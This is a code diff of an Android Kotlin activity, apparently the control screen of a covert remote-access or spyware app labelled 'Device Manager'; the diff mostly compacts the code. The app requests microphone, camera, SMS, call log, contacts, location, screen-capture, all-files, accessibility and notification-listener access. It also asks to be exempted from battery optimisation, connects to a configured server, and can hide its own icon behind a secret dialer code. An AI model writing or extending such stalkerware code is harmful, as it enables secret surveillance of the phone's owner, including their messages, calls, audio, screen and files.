@@ -23,290 +23,106 @@ import android.widget.*
 import androidx.core.content.ContextCompat
 
 class MainActivity : Activity() {
-
     private lateinit var statusText: TextView
     private lateinit var btnToggle: Button
 
     private val connReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action == ConnectionService.ACTION_STATUS) {
-                updateStatus()
-            }
-        }
+        override fun onReceive(context: Context?, intent: Intent?) { if (intent?.action == ConnectionService.ACTION_STATUS) updateStatus() }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         val scroll = ScrollView(this)
-        val root = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(48, 80, 48, 80)
-            setBackgroundColor(Color.parseColor("#121212"))
-        }
-        scroll.addView(root)
-        setContentView(scroll)
+        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(48, 80, 48, 80); setBackgroundColor(Color.parseColor("#121212")) }
+        scroll.addView(root); setContentView(scroll)
 
-        root.addView(TextView(this).apply {
-            text = "Device Manager"
-            textSize = 26f
-            setTextColor(Color.WHITE)
-            setTypeface(null, Typeface.BOLD)
-            gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 40)
-        })
+        root.addView(TextView(this).apply { text = "Device Manager"; textSize = 26f; setTextColor(Color.WHITE); setTypeface(null, Typeface.BOLD); gravity = Gravity.CENTER; setPadding(0, 0, 0, 40) })
 
         val configCard = createCard()
         configCard.addView(TextView(this).apply { text = "Configuration"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
         
-        val nameEt = EditText(this).apply {
-            hint = "Device Name"
-            setText(Prefs.getDeviceName(this@MainActivity))
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.GRAY)
-            setBackgroundColor(Color.parseColor("#1E1E1E"))
-            setPadding(30, 30, 30, 30)
-        }
+        val nameEt = EditText(this).apply { hint = "Device Name"; setText(Prefs.getDeviceName(this@MainActivity)); setTextColor(Color.WHITE); setHintTextColor(Color.GRAY); setBackgroundColor(Color.parseColor("#1E1E1E")); setPadding(30, 30, 30, 30) }
         configCard.addView(nameEt)
-
-        val serverEt = EditText(this).apply {
-            hint = "Server URL"
-            setText(Prefs.getServer(this@MainActivity))
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.GRAY)
-            setBackgroundColor(Color.parseColor("#1E1E1E"))
-            setPadding(30, 30, 30, 30)
-        }
+        val serverEt = EditText(this).apply { hint = "Server URL"; setText(Prefs.getServer(this@MainActivity)); setTextColor(Color.WHITE); setHintTextColor(Color.GRAY); setBackgroundColor(Color.parseColor("#1E1E1E")); setPadding(30, 30, 30, 30) }
         configCard.addView(serverEt)
-
-        val pskEt = EditText(this).apply {
-            hint = "Auth Key (PSK)"
-            setText(Prefs.getPsk(this@MainActivity))
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.GRAY)
-            setBackgroundColor(Color.parseColor("#1E1E1E"))
-            setPadding(30, 30, 30, 30)
-            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
-        }
+        val pskEt = EditText(this).apply { hint = "Auth Key (PSK)"; setText(Prefs.getPsk(this@MainActivity)); setTextColor(Color.WHITE); setHintTextColor(Color.GRAY); setBackgroundColor(Color.parseColor("#1E1E1E")); setPadding(30, 30, 30, 30); inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD }
         configCard.addView(pskEt)
 
         configCard.addView(createBtn("Save Settings", "#323232", Color.WHITE) {
-            Prefs.setDeviceName(this@MainActivity, nameEt.text.toString().trim())
-            Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
-            Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
-            Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
+            Prefs.setDeviceName(this@MainActivity, nameEt.text.toString().trim()); Prefs.setServer(this@MainActivity, serverEt.text.toString().trim()); Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim()); Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
         })
         root.addView(configCard)
 
         val statusCard = createCard()
         statusCard.addView(TextView(this).apply { text = "Connection Status"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,10) })
-        
-        statusText = TextView(this).apply {
-            setTextColor(Color.LTGRAY)
-            textSize = 13f
-            setPadding(0, 0, 0, 30)
-            setLineSpacing(0f, 1.5f)
-        }
+        statusText = TextView(this).apply { setTextColor(Color.LTGRAY); textSize = 13f; setPadding(0, 0, 0, 30); setLineSpacing(0f, 1.5f) }
         statusCard.addView(statusText)
-
         btnToggle = createBtn("Start Service", "#00E676", Color.BLACK) { toggleService() }
         statusCard.addView(btnToggle)
         root.addView(statusCard)
 
         val permCard = createCard()
         permCard.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
-
         permCard.addView(createBtn("Request Runtime Permissions", "#1E1E1E", Color.WHITE) { requestPerms() })
         permCard.addView(createBtn("Grant Screen Capture", "#1E1E1E", Color.WHITE) { requestScreenCapture() })
         permCard.addView(createBtn("Allow All Files Access", "#1E1E1E", Color.WHITE) { requestAllFiles() })
         permCard.addView(createBtn("Disable Battery Optimization (Crucial)", "#FF5252", Color.WHITE) { requestIgnoreBatteryOptimizations() })
-        
         permCard.addView(createBtn("Enable Accessibility Service", "#1E1E1E", Color.WHITE) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
         permCard.addView(createBtn("Enable Notification Listener", "#1E1E1E", Color.WHITE) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) })
         root.addView(permCard)
 
         val dangerCard = createCard()
-        dangerCard.addView(createBtn("Hide App Icon", "#B71C1C", Color.WHITE) {
-            StealthManager.hide(this@MainActivity)
-            Toast.makeText(this@MainActivity, "Icon hidden. Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show()
-        })
+        dangerCard.addView(createBtn("Hide App Icon", "#B71C1C", Color.WHITE) { StealthManager.hide(this@MainActivity); Toast.makeText(this@MainActivity, "Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show() })
         root.addView(dangerCard)
 
         statusText.postDelayed({ requestPerms() }, 1000)
-        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-            if (!am.canScheduleExactAlarms()) {
-                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM)
-                intent.data = Uri.parse("package:$packageName")
-                startActivity(intent)
-            }
+            if (!am.canScheduleExactAlarms()) { val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM); intent.data = Uri.parse("package:$packageName"); startActivity(intent) }
         }
     }
 
-    override fun onStart() {
-        super.onStart()
-        val filter = IntentFilter(ConnectionService.ACTION_STATUS)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(connReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
-        } else {
-            registerReceiver(connReceiver, filter)
-        }
-    }
-
-    override fun onStop() {
-        super.onStop()
-        unregisterReceiver(connReceiver)
-    }
-
-    override fun onResume() {
-        super.onResume()
-        updateStatus()
-    }
+    override fun onStart() { super.onStart(); val filter = IntentFilter(ConnectionService.ACTION_STATUS); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(connReceiver, filter, Context.RECEIVER_NOT_EXPORTED) else registerReceiver(connReceiver, filter) }
+    override fun onStop() { super.onStop(); unregisterReceiver(connReceiver) }
+    override fun onResume() { super.onResume(); updateStatus() }
 
     private fun toggleService() {
-        if (Prefs.isRunning(this)) {
-            val intent = Intent(this, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }
-            startService(intent)
-        } else {
-            if (Prefs.getServer(this).isBlank() || Prefs.getPsk(this).isBlank()) {
-                Toast.makeText(this, "Save settings first.", Toast.LENGTH_SHORT).show()
-                return
-            }
-            ContextCompat.startForegroundService(this, Intent(this, ConnectionService::class.java))
-        }
+        if (Prefs.isRunning(this)) { startService(Intent(this, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }) } 
+        else { if (Prefs.getServer(this).isBlank()) return; ContextCompat.startForegroundService(this, Intent(this, ConnectionService::class.java)) }
         updateStatus()
     }
 
     private fun updateStatus() {
-        val isRunning = Prefs.isRunning(this)
-        val isWsConnected = ConnectionService.isWsConnected
-
-        if (isRunning) {
-            btnToggle.text = "STOP SERVICE"
-            btnToggle.background = getRoundRect("#FF5252")
-            btnToggle.setTextColor(Color.WHITE)
-        } else {
-            btnToggle.text = "START SERVICE"
-            btnToggle.background = getRoundRect("#00E676")
-            btnToggle.setTextColor(Color.BLACK)
-        }
+        val isRunning = Prefs.isRunning(this); val isWs = ConnectionService.isWsConnected
+        btnToggle.text = if (isRunning) "STOP SERVICE" else "START SERVICE"
+        btnToggle.background = getRoundRect(if (isRunning) "#FF5252" else "#00E676")
+        btnToggle.setTextColor(if (isRunning) Color.WHITE else Color.BLACK)
 
         val sb = StringBuilder()
-        if (isRunning) {
-            if (isWsConnected) sb.append("✅ Server Connected\n")
-            else sb.append("🟡 Connecting to Server...\n")
-        } else {
-            sb.append("🔴 Service Offline\n")
-        }
+        if (isRunning) { if (isWs) sb.append("✅ Server Connected\n") else sb.append("🟡 Connecting to Server...\n") } else sb.append("🔴 Service Offline\n")
         sb.append("--------------------\n")
-
         sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "✅ Microphone\n" else "❌ Microphone\n")
         sb.append(if (checkPerm(Manifest.permission.CAMERA)) "✅ Camera\n" else "❌ Camera\n")
         sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "✅ SMS & Calls\n" else "❌ SMS & Calls\n")
         sb.append(if (TouchService.instance != null) "✅ Accessibility\n" else "❌ Accessibility\n")
-        
-        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
-        sb.append(if (notifEnabled) "✅ Notifications\n" else "❌ Notifications\n")
-        if (Build.VERSION.SDK_INT >= 30) {
-            sb.append(if (Environment.isExternalStorageManager()) "✅ All Files Access" else "❌ All Files Access")
-        }
+        sb.append(if (Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true) "✅ Notifications\n" else "❌ Notifications\n")
+        if (Build.VERSION.SDK_INT >= 30) sb.append(if (Environment.isExternalStorageManager()) "✅ All Files Access" else "❌ All Files Access")
         statusText.text = sb.toString()
     }
 
     private fun checkPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
-
-    private fun createCard(): LinearLayout {
-        return LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setBackgroundColor(Color.parseColor("#1E1E1E"))
-            setPadding(40, 40, 40, 40)
-            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-            params.setMargins(0, 0, 0, 40)
-            layoutParams = params
-            val bg = GradientDrawable()
-            bg.setColor(Color.parseColor("#1E1E1E"))
-            bg.cornerRadius = 40f
-            background = bg
-        }
-    }
-
-    private fun getRoundRect(colorHex: String): GradientDrawable {
-        val bg = GradientDrawable()
-        bg.setColor(Color.parseColor(colorHex))
-        bg.cornerRadius = 30f
-        return bg
-    }
-
-    private fun createBtn(label: String, bgColor: String, textColor: Int, onClick: () -> Unit): Button {
-        return Button(this).apply {
-            text = label
-            setTextColor(textColor)
-            background = getRoundRect(bgColor)
-            setPadding(0, 35, 0, 35)
-            setTypeface(null, Typeface.BOLD)
-            setOnClickListener { onClick() }
-            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-            params.setMargins(0, 15, 0, 0)
-            layoutParams = params
-        }
-    }
+    private fun createCard(): LinearLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setBackgroundColor(Color.parseColor("#1E1E1E")); setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, 0, 0, 40) }; background = getRoundRect("#1E1E1E", 40f) }
+    private fun getRoundRect(colorHex: String, rad: Float = 30f): GradientDrawable = GradientDrawable().apply { setColor(Color.parseColor(colorHex)); cornerRadius = rad }
+    private fun createBtn(label: String, bgColor: String, textColor: Int, onClick: () -> Unit): Button = Button(this).apply { text = label; setTextColor(textColor); background = getRoundRect(bgColor); setPadding(0, 35, 0, 35); setTypeface(null, Typeface.BOLD); setOnClickListener { onClick() }; layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, 15, 0, 0) } }
 
     private fun requestPerms() {
-        val perms = mutableListOf(
-            Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA,
-            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
-            Manifest.permission.POST_NOTIFICATIONS
-        )
-        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.READ_MEDIA_IMAGES)
-        else perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-
-        val missing = perms.filter { !checkPerm(it) }
-        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 100)
-        else Toast.makeText(this, "All runtime permissions granted.", Toast.LENGTH_SHORT).show()
+        val perms = mutableListOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS, Manifest.permission.POST_NOTIFICATIONS)
+        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.READ_MEDIA_IMAGES) else perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        val missing = perms.filter { !checkPerm(it) }; if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 100)
     }
+    private fun requestScreenCapture() { startActivityForResult((getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager).createScreenCaptureIntent(), 200) }
+    private fun requestAllFiles() { if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) { try { startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).addCategory("android.intent.category.DEFAULT").setData(Uri.parse("package:$packageName"))) } catch (e: Exception) { startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)) } } }
+    private fun requestIgnoreBatteryOptimizations() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).setData(Uri.parse("package:$packageName"))) } }
 
-    private fun requestScreenCapture() {
-        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(mpm.createScreenCaptureIntent(), 200)
-    }
-
-    private fun requestAllFiles() {
-        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-            try {
-                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                intent.addCategory("android.intent.category.DEFAULT")
-                intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
-                startActivity(intent)
-            } catch (e: Exception) {
-                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-            }
-        } else {
-            Toast.makeText(this, "All files access granted or not needed.", Toast.LENGTH_SHORT).show()
-        }
-    }
-
-    private fun requestIgnoreBatteryOptimizations() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val intent = Intent()
-            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
-            intent.data = Uri.parse("package:$packageName")
-            try {
-                startActivity(intent)
-            } catch (e: Exception) {
-                Toast.makeText(this, "Please manually disable battery optimization in settings.", Toast.LENGTH_LONG).show()
-            }
-        }
-    }
-
-    @Deprecated("Deprecated in Java")
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == 200 && resultCode == RESULT_OK && data != null) {
-            ConnectionService.screenResultCode = resultCode
-            ConnectionService.screenData = data
-            Toast.makeText(this, "Screen capture granted.", Toast.LENGTH_SHORT).show()
-        }
-    }
+    @Deprecated("Deprecated in Java") override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == 200 && resultCode == RESULT_OK && data != null) { ConnectionService.screenResultCode = resultCode; ConnectionService.screenData = data; Toast.makeText(this, "Screen capture granted.", Toast.LENGTH_SHORT).show() } }
 }
